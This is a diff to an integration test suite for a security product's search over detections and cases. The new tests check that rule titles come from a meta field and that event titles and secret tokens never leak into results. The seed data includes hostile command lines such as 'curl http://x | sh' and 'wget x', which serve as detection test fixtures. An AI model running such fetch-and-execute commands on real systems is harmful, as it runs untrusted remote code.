@@ -48,7 +48,7 @@ describe("ad-hoc search over detections and cases (real database)", () => {
     const a = await createTestAgent(tenant.id);
     const b = await createTestAgent(tenant.id);
     const now = Date.now();
-    const newest = await createTestDetection(tenant.id, a.id, { technique: "T1059.001", severity: "high", timestamp: new Date(now - HOUR), event: { title: "Encoded PowerShell", cmdline: "curl http://x | sh" } });
+    const newest = await createTestDetection(tenant.id, a.id, { technique: "T1059.001", severity: "high", timestamp: new Date(now - HOUR), meta: { title: "Encoded PowerShell" }, event: { cmdline: "curl http://x | sh" } });
     const older = await createTestDetection(tenant.id, a.id, { technique: "T1059.004", severity: "low", timestamp: new Date(now - 2 * HOUR), event: { cmdline: "ls" } });
     await createTestDetection(tenant.id, b.id, { technique: "T1105", severity: "high", timestamp: new Date(now - HOUR), event: { cmdline: "wget x" } });
     await createTestDetection(tenant.id, a.id, { technique: "T1059.001", timestamp: new Date(now - 30 * HOUR) });
@@ -73,7 +73,7 @@ describe("ad-hoc search over detections and cases (real database)", () => {
     const tenant = await createTestTenant();
     const agent = await createTestAgent(tenant.id);
     const grouped = await prisma.case.create({ data: { tenantId: tenant.id, title: "T1059 activity", severity: "high", status: "open" } });
-    await createTestDetection(tenant.id, agent.id, { caseId: grouped.id, event: { title: "Encoded PowerShell", cmdline: "secret-token-123" } });
+    await createTestDetection(tenant.id, agent.id, { caseId: grouped.id, meta: { title: "Encoded PowerShell" }, event: { cmdline: "secret-token-123" } });
     await createTestDetection(tenant.id, agent.id, { event: { cmdline: "no title here" } });
 
     const page = await run(tenant.id, { source: "detections", query: huntQuery });
@@ -83,6 +83,50 @@ describe("ad-hoc search over detections and cases (real database)", () => {
     expect(withCase).toMatchObject({ caseTitle: "T1059 activity", title: "Encoded PowerShell" });
     expect(detectionRows(page).find((r) => r.caseId === null)).toMatchObject({ caseTitle: null, title: null });
     expect(JSON.stringify(page)).not.toContain("secret-token-123");
+  });
+
+  // `parseDetectionPayload` stores a structured detection's title in `meta.title` and its first
+  // triggering event in `event`: the rule title is the first, never a field of the second (ADR-0025
+  // point 9). The seeds below use that storage layout, with a different, sensitive `event.title`.
+  it("returns the rule title from meta and never the event's own title field", async () => {
+    const tenant = await createTestTenant();
+    const agent = await createTestAgent(tenant.id);
+    const rule = await createTestDetection(tenant.id, agent.id, {
+      meta: { title: "Encoded PowerShell", source: { engine: "sigma" } },
+      event: { title: "event-title-with-secret-ABC123", cmdline: "secret-token-123" },
+    });
+    // An event that carries a `title` and a detection whose meta has none: no rule title, and
+    // the event's value does not stand in for it.
+    const untitled = await createTestDetection(tenant.id, agent.id, {
+      meta: { source: { engine: "sigma" } },
+      event: { title: "event-title-only-DEF456" },
+    });
+    // A meta title that is not a string is not a title.
+    const odd = await createTestDetection(tenant.id, agent.id, {
+      meta: { title: { nested: "object-title-GHI789" } },
+      event: { title: "event-title-for-odd-JKL012" },
+    });
+
+    const page = await run(tenant.id, { source: "detections", query: huntQuery });
+
+    const byId = (id: string) => detectionRows(page).find((r) => r.id === id);
+    expect(byId(rule.id)?.title).toBe("Encoded PowerShell");
+    expect(byId(untitled.id)?.title).toBeNull();
+    expect(byId(odd.id)?.title).toBeNull();
+    const wire = JSON.stringify(page);
+    for (const leaked of ["event-title-with-secret-ABC123", "event-title-only-DEF456", "event-title-for-odd-JKL012", "object-title-GHI789", "secret-token-123"]) {
+      expect(wire).not.toContain(leaked);
+    }
+  });
+
+  it("cuts a long rule title from meta at the row limit", async () => {
+    const tenant = await createTestTenant();
+    const agent = await createTestAgent(tenant.id);
+    await createTestDetection(tenant.id, agent.id, { meta: { title: "x".repeat(500) } });
+
+    const page = await run(tenant.id, { source: "detections", query: huntQuery });
+
+    expect(detectionRows(page)[0].title).toBe("x".repeat(200));
   });
 
   it("pages through every match exactly once, also when many share one timestamp", async () => {
